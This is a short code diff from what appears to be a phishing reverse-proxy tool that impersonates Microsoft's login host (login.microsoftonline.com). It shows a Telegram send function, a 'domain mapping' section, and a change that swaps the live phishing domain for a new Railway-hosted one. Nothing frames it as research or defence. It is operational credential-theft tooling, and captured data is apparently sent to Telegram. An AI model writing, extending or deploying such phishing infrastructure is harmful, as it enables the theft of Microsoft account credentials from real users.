@@ -31,7 +31,7 @@ async function sendToTelegram(message) {
 // ==================== END TELEGRAM ====================
 
 // ==================== CARLOS TECHNIQUES: DOMAIN MAPPING ====================
-const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'evilworkermod-production.up.railway.app';
+const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'triumphant-adventure-production-8a49.up.railway.app';
 const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';
 
 const SUBDOMAIN_MAPPING = {
